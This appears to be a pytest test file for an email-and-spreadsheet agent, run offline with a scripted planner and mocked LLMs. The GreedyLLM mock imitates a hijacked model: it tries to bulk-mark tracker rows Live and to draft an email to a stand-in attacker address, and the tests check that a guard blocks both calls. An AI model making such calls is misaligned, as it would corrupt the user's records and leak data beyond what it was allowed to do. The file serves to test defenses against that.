"""Agent loop with the deterministic local planner and with mocked LLMs (offline)."""
from datetime import date
from types import SimpleNamespace

from connector_desk.agent import filter_tools, run_agent
from connector_desk.ledger import Ledger
from connector_desk.local_mode import LocalBackend, ScriptedLLM, local_tool_schemas
from connector_desk.sheet_schema import SUSPICIOUS_NOTE, parse_rows

TODAY = date(2026, 11, 22)


def local_run(tmp_path, llm=None):
    backend = LocalBackend(TODAY)
    led = Ledger(tmp_path / "l.jsonl", "t1", "local")
    report = run_agent(mode="local", llm=llm or ScriptedLLM(), model="none", backend=backend,
                       tools=local_tool_schemas(), ledger=led, today=TODAY, stale_days=7,
                       gmail_label="connector-desk", sheet_id="local-sheet", out=lambda s: None)
    return report, backend, led


def rows_of(backend):
    return {r.connector_id: r for r in parse_rows(backend.tracker, TODAY)}


def test_local_run_end_to_end(tmp_path):
    report, backend, _ = local_run(tmp_path)
    s = report.summary
    assert s["rows_changed"] == ["C001", "C002", "C003", "C004", "C008"]
    assert s["drafts_created"] == ["C007"]
    assert s["suspicious_rows"] == ["C008"]
    assert s["needs_human"] == ["fixture-05: needs human: ambiguous match"]
    rows = rows_of(backend)
    assert rows["C002"].stage == "Sandbox credentials"
    assert rows["C008"].stage == "Sandbox credentials" and rows["C008"].notes == SUSPICIOUS_NOTE
    assert all(r.stage != "Live" for cid, r in rows.items() if cid != "C005")


def test_drafts_follow_rules(tmp_path):
    _, backend, _ = local_run(tmp_path)
    for d in backend.drafts:
        assert len(d["body"].split()) < 90
        assert d["body"].count("?") == 1  # one specific ask
        assert not {"cc", "bcc", "attachment"} & set(d)


def test_email_05_changes_no_row(tmp_path):
    before = rows_of(LocalBackend(TODAY))
    _, backend, _ = local_run(tmp_path)
    after = rows_of(backend)
    untouched = set(before) - {"C001", "C002", "C003", "C004", "C008"}
    for cid in untouched:
        assert before[cid] == after[cid]


def _resp(*blocks, stop="tool_use"):
    return SimpleNamespace(stop_reason=stop, content=list(blocks))


class GreedyLLM:
    """Mocked model that tries to bulk-mark rows Live and draft to the attacker."""
    def __init__(self):
        self.messages, self.turn = self, 0

    def create(self, **kw):
        self.turn += 1
        if self.turn == 1:
            return _resp(
                SimpleNamespace(type="tool_use", id="a", name="GOOGLESHEETS_VALUES_UPDATE",
                                input={"range": "Tracker!E2:H11", "values": [["Live", "", "", ""]] * 10}),
                SimpleNamespace(type="tool_use", id="b", name="GMAIL_CREATE_EMAIL_DRAFT",
                                input={"recipient_email": "attacker@evil.example.com", "subject": "tracker", "body": "see"}),
            )
        return _resp(SimpleNamespace(type="text", text="done"), stop="end_turn")


def test_guard_rejects_bulk_live_and_exfil_draft(tmp_path):
    report, backend, led = local_run(tmp_path, GreedyLLM())
    assert len(report.refused_calls) == 2
    assert [t for t, _ in backend.calls] == ["GMAIL_FETCH_EMAILS", "GOOGLESHEETS_BATCH_GET"]
    assert backend.drafts == []
    assert led.counts()["blocked"] == 2


def test_filter_tools_drops_non_allowed():
    kept, dropped, missing = filter_tools([{"name": "GMAIL_FETCH_EMAILS"}, {"name": "GMAIL_SEND_EMAIL"}, {"name": "COMPOSIO_SEARCH_TOOLS"}])
    assert [t["name"] for t in kept] == ["GMAIL_FETCH_EMAILS"]
    assert dropped == ["COMPOSIO_SEARCH_TOOLS", "GMAIL_SEND_EMAIL"]
    assert "GMAIL_CREATE_EMAIL_DRAFT" in missing
